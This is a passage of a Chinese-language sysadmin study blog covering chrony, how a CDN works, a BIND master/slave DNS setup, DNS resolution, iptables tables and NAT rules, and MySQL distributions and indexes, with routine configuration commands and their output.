class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##查看源服务器状态</span><br>chronyc sources -V<br>MS Name/IP address         Stratum Poll Reach LastRx Last sample               <br>===============================================================================<br>^* 10.0.0.128                    3   6   377     4    +84us[ +108us] +/-   16ms<br><br><span class="hljs-comment">##服务端查看已经连接的客户端</span><br>[root@master ~]<span class="hljs-comment">#chronyc clients</span><br>Hostname                      NTP   Drop Int IntL Last     Cmd   Drop Int  Last<br>===============================================================================<br>10.0.0.132                     43      0   6   -    42       0      0   -     -<br>10.0.0.129                     17      0   6   -    58       0      0   -     -<br><br><span class="hljs-comment">##显示当前时间源信息(客户端)</span><br>[root@rocky ~]<span class="hljs-comment">#chronyc sources</span><br>MS Name/IP address         Stratum Poll Reach LastRx Last sample               <br>===============================================================================<br>^* 10.0.0.128                    3   6   377     4    +84us[ +108us] +/-   16ms<br><br>[root@rocky ~]<span class="hljs-comment">#chronyc sources -v</span><br>  .-- Source mode  <span class="hljs-string">&#x27;^&#x27;</span> = server, <span class="hljs-string">&#x27;=&#x27;</span> = peer, <span class="hljs-string">&#x27;#&#x27;</span> = <span class="hljs-built_in">local</span> clock.<br> / .- Source state <span class="hljs-string">&#x27;*&#x27;</span> = current best, <span class="hljs-string">&#x27;+&#x27;</span> = combined, <span class="hljs-string">&#x27;-&#x27;</span> = not combined,<br>| /             <span class="hljs-string">&#x27;x&#x27;</span> = may be <span class="hljs-keyword">in</span> error, <span class="hljs-string">&#x27;~&#x27;</span> = too variable, <span class="hljs-string">&#x27;?&#x27;</span> = unusable.<br>||                                                 .- xxxx [ yyyy ] +/- zzzz<br>||      Reachability register (octal) -.           |  xxxx = adjusted offset,<br>||      Log2(Polling interval) --.      |          |  yyyy = measured offset,<br>||                                \     |          |  zzzz = estimated error.<br>||                                 |    |           \<br>MS Name/IP address         Stratum Poll Reach LastRx Last sample               <br>===============================================================================<br>^* 10.0.0.128                    3   6   377    55    +32us[  +53us] +/-   16ms<br></code></pre></td></tr></table></figure><h1 id="3-说明CDN的原理"><a href="#3-说明CDN的原理" class="headerlink" title="3.说明CDN的原理"></a>3.说明CDN的原理</h1><p>关于CDN的原理：内容分发网络（Content Delivery Network，CDN）是建立并覆盖在承载网上，由不同区域的服务器组成的分布式网络。将源站资源缓存到全国各地的边缘服务器，供用户就近获取，降低源站压力。</p><p>本地用户访问方向：</p><p>1.在本地找网站/图片缓存，本地浏览器</p><p>2.没有的话找到附近DNS服务器，通过全局的GSLB算法返回到客户端的最佳CDN节点</p><p>3.CDN节点上没有找到对应要访问的内容(.jpg/png，.html，.pdf等)，回源站拉源站数据，回源站拉数据需要一定的时间</p><p>4.从源站获取到数据，返回到客户端</p><p>5.客户端建立缓存，CDN节点建立缓存，下次访问的时候直接读缓存</p><h2 id="CDN使用方式"><a href="#CDN使用方式" class="headerlink" title="CDN使用方式"></a>CDN使用方式</h2><p>1.在源站搭建好相关的WEB服务，源站类型可以为服务器IP地址、OSS等</p><p><img src="2792175-20220912180414311-352890889.png" alt="img"></p><p>2.配置CDN服务，创建CDN域名，配置CDN回源到对应的源站：如果是服务器，则配置公网IP地址；如果是OSS，则添加OSS对应的对外访问域名</p><p><img src="2792175-20220912180414598-901633887.png" alt="img"></p><p>3.要启用CDN服务，需要公网DNS解析添加对应CDN加速域名的CNAME记录解析，访问到CNAME，访问到CDN加速域名的时候，即启用了CDN服务；同时如果CDN解析到源站是IP地址的话，将CDN的CNAME地址解析到对应的源站IP地址</p><p>xxx.ctfmall.com—&gt;xxx.ctfmall.com.w.kunluncan.com</p><p>xxx.ctfmall.com.w.kunluncan.com—&gt;IP地址</p><p>4.确保CDN访问到源站，对应的服务要起来，对应的资源路径要正确</p><p>5..访问到源站站点，访问正常，第一次如果是第一次配置访问，则会有点慢，因为需要回源站拉内容；第二次刷新访问正常，已经是读缓存内的内容了</p><h1 id="4-搭建智能DNS"><a href="#4-搭建智能DNS" class="headerlink" title="4.搭建智能DNS"></a>4.搭建智能DNS</h1><p>架构：搭建DNS服务器，从内网实现访问到公网</p><p>环境：主DNS服务器 10.0.0.128</p><p>从DNS服务器+客户端 10.0.0.129</p><h2 id="4-1-配置DNS主服务器，配置named-conf配置文件"><a href="#4-1-配置DNS主服务器，配置named-conf配置文件" class="headerlink" title="4.1 配置DNS主服务器，配置named.conf配置文件"></a>4.1 配置DNS主服务器，配置named.conf配置文件</h2><p>bind，bind-utils(dns测试工具，可以不装)</p><p>bind的测试工具包括：dig(最全面的域名解析工具)，host(简易版DNS解析测试)，nslookup(windows风格的)，最常用的就是dig，显示内容最多</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpm -ql bin-utils：查看这个包中有哪些工具<br>yum -y install <span class="hljs-built_in">bind</span> bind-utils<br>启动DNS服务：systemctl <span class="hljs-built_in">enable</span> --now named<br></code></pre></td></tr></table></figure><p><img src="2792175-20220912180414898-518406560.png" alt="img"></p><p>修改默认dns配置文件，监听为指定网段10.0.0.0/24，vim /etc/named.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">options &#123;<br>        //监听哪些机器：本地所有的IP<br>        listen-on port 53 &#123; localhost; &#125;; //监听本地所有的IP 53端口<br>        listen-on-v6 port 53 &#123; ::1; &#125;;<br>        directory       <span class="hljs-string">&quot;/var/named&quot;</span>;<br>        dump-file       <span class="hljs-string">&quot;/var/named/data/cache_dump.db&quot;</span>;<br>        statistics-file <span class="hljs-string">&quot;/var/named/data/named_stats.txt&quot;</span>;<br>        memstatistics-file <span class="hljs-string">&quot;/var/named/data/named_mem_stats.txt&quot;</span>;<br>        recursing-file  <span class="hljs-string">&quot;/var/named/data/named.recursing&quot;</span>;<br>        secroots-file   <span class="hljs-string">&quot;/var/named/data/named.secroots&quot;</span>;<br>        //允许哪些机器通过这个DNS查询:any所有机器<br>        allow-query     &#123; 10.0.0.0/24; &#125;;<br>&#125;<br><br><span class="hljs-comment">##包含了这两项</span><br>include <span class="hljs-string">&quot;/etc/named.rfc1912.zones&quot;</span>;<br>include <span class="hljs-string">&quot;/etc/named.root.key&quot;</span>;<br></code></pre></td></tr></table></figure><p>使用到的用户+用户组：root，named；group：named，安装了named服务后就会生成这个named的用户和用户组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span> root<br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><br><span class="hljs-built_in">id</span> named---记得修改域配置文件所属组为named<br>uid=25(named) gid=25(named) <span class="hljs-built_in">groups</span>=25(named)<br></code></pre></td></tr></table></figure><p>rndc命令：对于dns缓存，配置的使用，刷新Linux机器的DNS缓存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">rndc --<span class="hljs-built_in">help</span><br>rndc reload <span class="hljs-comment">##重新加载dns配置</span><br>rndc flush <span class="hljs-comment">##刷新缓存</span><br></code></pre></td></tr></table></figure><p>各种资源记录(RR：resource record)，文件路径：/var/named/named.localhost，/var/named/catyer.cn.zone(自已命名)，后续可以在这里写域名解析的文件</p><h2 id="4-2-写主DNS服务器配置-DNS记录"><a href="#4-2-写主DNS服务器配置-DNS记录" class="headerlink" title="4.2 写主DNS服务器配置(DNS记录)"></a>4.2 写主DNS服务器配置(DNS记录)</h2><p>SOA记录：一般写在首行，一条记录，作为起始的授权记录</p><p>NS：解析，正向解析记录</p><p>A记录：域名—IPV4地址</p><p>AAAA记录：域名—IPV6地址</p><p>TXT：文本记录</p><p>CNAME：别名记录(CDN，WAF等)</p><p>PTR：反向解析，指针</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http">vim /var/named/catyer.cn.zone #文件标准格式：其实也是个文件，只需要记得写入zone配置文件就好了<br><br>$TTL 1D<br>@       IN SOA  master admin.catyer.cn ( ;SOA记录:起始授权记录   <br>                                        20220719        ; serial,序列号，数据库文件的序列号<br>                                        3H              ; refresh,DNS刷新记录,从节点拉取<br>                                        10M             ; retry,服务器网络有问题,重试时间<br>                                        1W              ; expire,DNS记录过期时间<br>                                        3H )<br>@       IN      NS      master. ;主DNS服务器解析<br>master  A       10.0.0.128<br>www     A       10.0.0.128<br>k8s     A       10.0.0.128<br>linux   A       10.0.0.200<br></code></pre></td></tr></table></figure><p>主从DNS服务器的同步机制：主服务器一般是有新的更新就推送，从服务器一般是定时拉更新的数据</p><p>主从DNS同步依赖条件：serial，类似MySQL主从的binlog文件版本号的变化，binlog_000003类似这样的文件名</p><h2 id="PS：一定要记住修改catyer-cn-zone文件的所属组，不然这个文件是不生效的-本地域名解析"><a href="#PS：一定要记住修改catyer-cn-zone文件的所属组，不然这个文件是不生效的-本地域名解析" class="headerlink" title="PS：一定要记住修改catyer.cn.zone文件的所属组，不然这个文件是不生效的(本地域名解析)"></a>PS：一定要记住修改catyer.cn.zone文件的所属组，不然这个文件是不生效的(本地域名解析)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chgrp</span> named /var/named/catyer.cn.zone<br>ll /var/named/catyer.cn.zone<br>[root@master ~]<span class="hljs-comment">#ll /var/named/catyer.cn.zone</span><br>-rw-r----- 1 root named 435 Sep  5 22:45 /var/named/catyer.cn.zone<br></code></pre></td></tr></table></figure><h2 id="4-3-写主DNS域配置文件-etc-named-rfc1912-zones"><a href="#4-3-写主DNS域配置文件-etc-named-rfc1912-zones" class="headerlink" title="4.3 写主DNS域配置文件/etc/named.rfc1912.zones"></a>4.3 写主DNS域配置文件/etc/named.rfc1912.zones</h2><p>将zone的配置信息(catyer.cn)配置到统一的域配置文件内，这里面是/etc/named.frc1912.zones</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##写好主域的信息，type类型为master主域，file为catyer.cn.zone这个配置文件</span><br>vim /etc/named.rfc1912.zones<br>zone <span class="hljs-string">&quot;catyer.cn&quot;</span> IN &#123;<br>        <span class="hljs-built_in">type</span> master; <span class="hljs-comment">##DNS服务器类型是主服务器，主节点</span><br>        file <span class="hljs-string">&quot;catyer.cn.zone&quot;</span>; <span class="hljs-comment">##域配置文件：指向catyer</span><br>        allow-update &#123; none; &#125;;<br>&#125;;<br><br><span class="hljs-comment">##检查DNS配置文件以及域配置文件有无正确</span><br>named-checkconf<br>named-checkzone catyer.cn /var/named/catyer.cn.zone<br><br>rndc reload：重新加载dns配置文件zone<br>rndc flush：刷新本地DNS缓存<br><br><span class="hljs-comment">##本地网卡DNS解析指向自己</span><br>ONBOOT=<span class="hljs-string">&quot;yes&quot;</span><br>IPADDR=10.0.0.128<br>NETMASK=255.255.255.0<br>GATEWAY=10.0.0.2<br><span class="hljs-comment">#DNS1=114.114.114.114</span><br><span class="hljs-comment">#DNS2=8.8.8.8</span><br>DNS1=10.0.0.128<br>DNS2=10.0.0.129<br><br><span class="hljs-comment">##重启网络服务</span><br>systemctl restart network<br></code></pre></td></tr></table></figure><p>分别都可以解析到IP，即本地的DNS服务器搭建成功，访问本地服务。访问到k8s.catyer.cn这个域名服务的，添加了DNS A记录后，不需要添加本地HOST文件就可以访问到解析的域名了</p><p><img src="2792175-20220912180415241-1263453664.png" alt="img"></p><h2 id="4-4-搭建从DNS服务器-DNS2"><a href="#4-4-搭建从DNS服务器-DNS2" class="headerlink" title="4.4 搭建从DNS服务器(DNS2)"></a>4.4 搭建从DNS服务器(DNS2)</h2><p>安装dns服务：yum -y install bind bind-utils</p><p>注释掉named.conf配置文件内的监听限制，不然这个slave只会监听本地</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">options &#123;<br><span class="hljs-comment">//        listen-on port 53 &#123; 127.0.0.1; &#125;;</span><br>        listen-on-v6 port <span class="hljs-number">53</span> &#123; ::<span class="hljs-number">1</span>; &#125;;<br>        directory       <span class="hljs-string">&quot;/var/named&quot;</span>;<br>        dump-file       <span class="hljs-string">&quot;/var/named/data/cache_dump.db&quot;</span>;<br>        statistics-file <span class="hljs-string">&quot;/var/named/data/named_stats.txt&quot;</span>;<br>        memstatistics-file <span class="hljs-string">&quot;/var/named/data/named_mem_stats.txt&quot;</span>;<br>        recursing-file  <span class="hljs-string">&quot;/var/named/data/named.recursing&quot;</span>;<br>        secroots-file   <span class="hljs-string">&quot;/var/named/data/named.secroots&quot;</span>;<br><span class="hljs-comment">//       allow-query     &#123; localhost; &#125;;</span><br></code></pre></td></tr></table></figure><p>编辑域配置文件，写上是catyer.cn主DNS(主域)的从域，type为slave</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/named.rfc1912.zones<br>zone <span class="hljs-string">&quot;catyer.cn&quot;</span> &#123;<br>        <span class="hljs-built_in">type</span> slave;<br>        masters &#123;10.0.0.128;&#125;;<br>        file <span class="hljs-string">&quot;catyer.cn.zone.slave&quot;</span>;<br>&#125;;<br>systemctl restart named<br></code></pre></td></tr></table></figure><p>编辑好后，重启named服务，配置网卡文件DNS2(DNS从服务器)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/sysconfig/network-scripts/ifcfg-ens33<br>DNS1=10.0.0.128<br>DNS2=10.0.0.129<br><br>systemctl restart named<br>systemctl restart network<br><br><span class="hljs-comment">##刷新本地缓存</span><br>rndc reload<br>rndc flush<br><br><span class="hljs-comment">##停止dns1的服务</span><br>systemctl stop named<br></code></pre></td></tr></table></figure><p>尝试解析k8s.catyer.cn这个域名，发现承载的dns服务器是10.0.0.129，证明停止了DNS1，DNS2成功生效工作，k8s.catyer.cn是在10.0.0.128上面做的A记录，但是承载本地DNS解析的是129这台地址，k8s.catyer.cn这个地址本身的DNS解析就是10.0.0.128，从DNS搭建成功</p><p>在slave1上测试：dig k8s.catyer.cn</p><p><img src="2792175-20220912180415569-1992049804.png" alt="img"></p><h2 id="4-5-从指定的DNS服务器-IP-上查询该解析-DNS服务器地址"><a href="#4-5-从指定的DNS服务器-IP-上查询该解析-DNS服务器地址" class="headerlink" title="4.5 从指定的DNS服务器(IP)上查询该解析+DNS服务器地址"></a>4.5 从指定的DNS服务器(IP)上查询该解析+DNS服务器地址</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##windows环境</span><br>nslookup api.ctfmall.com 100.100.2.136<br><br><span class="hljs-comment">##Linux环境，+@符号</span><br>dig k8s.catyer.cn @10.0.0.128<br>dig k8s.catyer.cn @10.0.0.129<br>host k8s.catyer.cn @10.0.0.8<br>dig k8s.catyer.cn<br></code></pre></td></tr></table></figure><h1 id="5-解释DNS解析流程"><a href="#5-解释DNS解析流程" class="headerlink" title="5.解释DNS解析流程"></a>5.解释DNS解析流程</h1><p><img src="2792175-20220912180415976-354929362.png" alt="img"></p><p>DNS解析流程：</p><p>想要访问<a href="http://www.baidu.com这个域名,使用迭代查询的方式去查询这个域名的解析的ip地址/">www.baidu.com这个域名，使用迭代查询的方式去查询这个域名的解析的IP地址</a></p><p>1.找本地地址(host文件)—&gt;本地配置的DNS服务器(DNS缓存(浏览器))，不用每次都去找根服务器；DNS服务器有缓存，本地也有缓存；</p><p>windows服务器有DNS缓存，使用ipconfig /flushdns可以刷新本地缓存；Linux服务器的DNS客户端没有缓存</p><p>2.DNS服务器找到根服务器(互联网的根服务器)，开始迭代查询，根服务器：.，其实完整的域名应该是<a href="http://www.baidu.com/">www.baidu.com</a>.</p><p>3.找顶级域名，因为baidu.com是.com，所以找.com的顶级域名服务器里面找解析</p><p>4.找一级域名baidu.com这个的DNS解析</p><p>5.从baidu.com这个解析里面就有<a href="http://www.baidu.com这个二级域名配置了记录集,传回到用户,实现www.baidu.com这个域名解析到百度后端的某个ip地址/">www.baidu.com这个二级域名配置了记录集，传回到用户，实现www.baidu.com这个域名解析到百度后端的某个IP地址</a></p><p>递归查询：指的是请求到了，服务器无法反馈结果，会去找到结果并且最终反馈—处理到底；DNS服务器必须返回一个准确的结果给到客户端</p><p>迭代查询：找别人查找，自己不处理—找别的DNS服务器查询解析，根域名—顶级域名—一级域名</p><h2 id="DNS查询的工具"><a href="#DNS查询的工具" class="headerlink" title="DNS查询的工具"></a>DNS查询的工具</h2><p>windows：nslookup</p><p>linux：安装bind-utils，工具包有dig，nslookup，host等工具，比较常用的就是dig，能够显示比较完整的信息，host比较简洁，解析出IP地址出来</p><p>rpm -ql bind-utils</p><p><img src="2792175-20220912180416417-542984486.png" alt="img"></p><h1 id="6-iptables-5表5链解释"><a href="#6-iptables-5表5链解释" class="headerlink" title="6.iptables 5表5链解释"></a>6.iptables 5表5链解释</h1><p>iptables5表指的是：filter：过滤规则，允许/拒绝某些流量流入，比如INPUT，OUPUT等，NAT：地址转换表，包括SNAT和DNAT，mangle：修改数据规则表，raw：加快通过防火墙的速度</p><p>security：强制安全规则，由SELINUX实现，/etc/config/selinux</p><p>5表中最为常用的就是filter(过滤表)，和nat(地址转换表)</p><p>5链（chain）：PREROUTING（总入口），INPUT（入方向的包），OUTPUT（出方向的包），FORWARD（经过内部转发，转发机制），POSTROUTING（总出口）</p><p><img src="2792175-20220912180416781-261006889.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##查看防火墙规则</span><br>iptables -L<br>[root@master ~]<span class="hljs-comment">#iptables -L</span><br>Chain INPUT (policy ACCEPT)<br>target     prot opt <span class="hljs-built_in">source</span>               destination         <br>ACCEPT     udp  --  anywhere             anywhere             udp dpt:domain<br>ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:domain<br>ACCEPT     udp  --  anywhere             anywhere             udp dpt:bootps<br>ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:bootps<br>ACCEPT     udp  --  anywhere             anywhere             udp dpt:domain<br>ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:domain<br>ACCEPT     udp  --  anywhere             anywhere             udp dpt:bootps<br>ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:bootps<br>ACCEPT     tcp  --  172.16.0.128         10.0.0.0/24         <br></code></pre></td></tr></table></figure><h1 id="7-iptables-firewalld-nftable-实现主机防火墙。5000-6000端口仅192-168-0-0-24网段内的主机访问"><a href="#7-iptables-firewalld-nftable-实现主机防火墙。5000-6000端口仅192-168-0-0-24网段内的主机访问" class="headerlink" title="7.iptables/firewalld/nftable 实现主机防火墙。5000-6000端口仅192.168.0.0/24网段内的主机访问"></a>7.iptables/firewalld/nftable 实现主机防火墙。5000-6000端口仅192.168.0.0/24网段内的主机访问</h1><p>环境：外网业务机器开放5000-6000业务端口，只允许公司内网192.168.0.0/24网段访问，目前先实现80业务端口访问</p><p>防火墙过滤：iptables。使用SNAT做流量转发，仅允许内网网段访问，需要从POSTROUTING chain转发出去，一般使用动态IP地址转换，</p><p>防火墙主机：10.0.0.128 网卡1：NAT模式（网关10.0.0.2） 172.16.0.10 网卡2：仅主机模式（网关172.16.0.2）</p><p>内网访问客户端：10.0.0.129</p><p>ubuntu外网机器：172.16.0.135 网卡2：仅主机模式（网关172.16.0.2）服务：nginx web服务器</p><p>前提条件：开启IPV4转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master ~]<span class="hljs-comment">#grep ipv4 /etc/sysctl.conf</span><br>net.ipv4.ip_forward=1<br>sysctl -p<br></code></pre></td></tr></table></figure><p>配置基本的iptables snat转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##ubuntu主机安装nginx服务，ubuntu默认直接启动</span><br>apt -y install nginx<br><br><span class="hljs-comment">##iptables节点</span><br><span class="hljs-comment">##专线网络,to-source表示当前固定的公网IP</span><br>iptables -t nat -I POSTROUTING -s 10.0.0.0/24 ! -d 10.0.0.0/24 -j SNAT --to-source 100.9.6.4<br><br><span class="hljs-comment">##动态IP，查看NAT表的信息，除了公网的10.0.0.0/24网段，其他全部转发，从POSTROUTING出去;-I表示在NAT表前面插入，如果加 -A POSTROUTING表示在表的最后添加这条规则，-j MASQUERADE表示是转化到动态IP，而不是固定公网IP</span><br>iptables -t nat -I POSTROUTING -d 10.0.0.0/24<br>iptables -t nat -I POSTROUTING -s 10.0.0.0/24 ! -d 10.0.0.0/24 -j MASQUERADE<br>iptables -t nat -nL / iptables -t nat -nL --line-numbers <span class="hljs-comment">##显示行号</span><br><br>Chain POSTROUTING (policy ACCEPT)<br>target     prot opt <span class="hljs-built_in">source</span>               destination         <br>MASQUERADE  all  --  10.0.0.0/24         !10.0.0.0/24 <br><br><span class="hljs-comment">##删除NAT表的第一条规则</span><br>iptables -t nat -D POSTROUTING 1<br><br><span class="hljs-comment">##配置iptables机器的双网卡，要和ubuntu主机同一个网段；开启网卡2的仅主机模式，需要在VMware内配置</span><br><span class="hljs-built_in">cp</span> ifcfg-ens33 ifcfg-ens36<br>IPADDR=172.16.0.10<br>NETMASK=255.255.255.0<br>GATEWAY=172.16.0.2<br><br><span class="hljs-comment">##ubuntu nginx默认web目录，修改nginx目录</span><br>root@ubuntu:/etc/nginx/sites-available<span class="hljs-comment"># pwd</span><br>vim /etc/nginx/sites-available/default<br><br>server &#123;<br>        listen 80 default_server;<br>        listen [::]:80 default_server;<br><br>        root /data/nginx;<br><br>        <span class="hljs-comment"># Add index.php to the list if you are using PHP</span><br>        index index.html index.htm index.nginx-debian.html;<br><br>        server_name _;<br>&#125;<br><br>nginx -t：检查Nginx服务配置服务<br>nginx: the configuration file /etc/nginx/nginx.conf syntax is ok<br>nginx: configuration file /etc/nginx/nginx.conf <span class="hljs-built_in">test</span> is successful<br><br>systemctl restart nginx<br><br><span class="hljs-comment">##在ubuntu上tail日志查看访问IP，获取到源端IP了；去掉POSTROUTING规则就无法curl通了，slave1的gateway是10.0.0.128，出口网关，所以在nginx日志中获取的是出口网关的IP</span><br>curl 172.16.0.135/nginx.txt<br>curl 172.16.0.135---&gt;nginx服务<br><br><span class="hljs-built_in">tail</span> -f /var/log/nginx/access.log<br>172.16.0.10 - - [01/Aug/2022:13:56:24 +0000] <span class="hljs-string">&quot;GET / HTTP/1.1&quot;</span> 200 612 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;curl/7.29.0&quot;</span><br><br><br><span class="hljs-comment">##curl一个大一点的文件，查看ubuntu端的tcp连接状态(ESTABLISHED)，ss -nt，peer查看远端的地址，证明TCP链接已经建立了</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/var/www/html/test2.txt bs=1M count=1024<br><br>State              Recv-Q           Send-Q           Local Address:Port          Peer   <br>ESTAB              0                1152608          172.16.0.135:80             172.16.0.10:53704<br></code></pre></td></tr></table></figure><p><img src="2792175-20220912180417091-852671336.png" alt="img"></p><p><img src="2792175-20220912180417401-1495155618.png" alt="img"></p><h1 id="8-mysql的各发行版有哪些-？"><a href="#8-mysql的各发行版有哪些-？" class="headerlink" title="8.mysql的各发行版有哪些 ？"></a>8.mysql的各发行版有哪些 ？</h1><p>MySQL：5.6 、5.7、8.0版本（linux 8.0 release），分为社区版和企业版</p><p>mariaDB：5.6、5.5、10.3（linux 8.0 release），MariaDB是由MySQL初始创建者在MySQL被Oracle收购之后，又独立成立了一家公司，来开发的数据库。MariaDB并不能完全和MySQL官方版完全兼容，但大多数功能是兼容的。</p><p>percona：Percona是由MySQL最初开发者组成的一个社区，Percona MySQL是基于官方社区版本二次开发的，在MySQL官方社区版的基础上增加了一些MySQL官方企业版才有的功能，同时对官方社区版进行了一些优化，从目前公布的数据来看，Percona MySQL 性能是要优于MySQL官方社区版的。</p><p>percona还是免费的，对于percona出了一个专业级别的mysql备份工具xtrabackup，和MySQL商业版的备份工具功能类似，还不用钱</p><table><thead><tr><th></th><th><strong>MySQL</strong></th><th><strong>Percona MySQL-server</strong></th><th><strong>MariaDB</strong></th></tr></thead><tbody><tr><td>是否开源</td><td>开源</td><td>开源</td><td>开源</td></tr><tr><td>事务型存储引擎</td><td>InnoDB</td><td>XtraDB</td><td>XtraDB</td></tr><tr><td>监控工具</td><td>企业版监控工具，社区版不提供</td><td>Percona Monitor工具</td><td>Monyog</td></tr></tbody></table><h1 id="9-mysql索引的作用"><a href="#9-mysql索引的作用" class="headerlink" title="9.mysql索引的作用"></a>9.mysql索引的作用</h1><p>MySQL索引一般是用于加速表的查询的，索引一般分为</p><p>1.主键索引：基于主键做的索引，比如订单表的编号是自动增长的(auto_increment)，同时订单号又是主键，可以做基于订单号的索引</p><p>2.聚簇索引：数据data和索引index放在一起，形成一个磁盘上的文件</p><p>3.B+TREE索引：索引上只存放索引信息，基本分为一层根节点+一层分支节点，下面都是数据了，查询效率最高，一般的MySQL表都是BTREE索引，同时下面的数据都是加了链表的，数据都是有链接起来的，查询速度快，节省性能—&gt;一般来说都是b_tree索引</p><p>查询某张表的索引情况</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 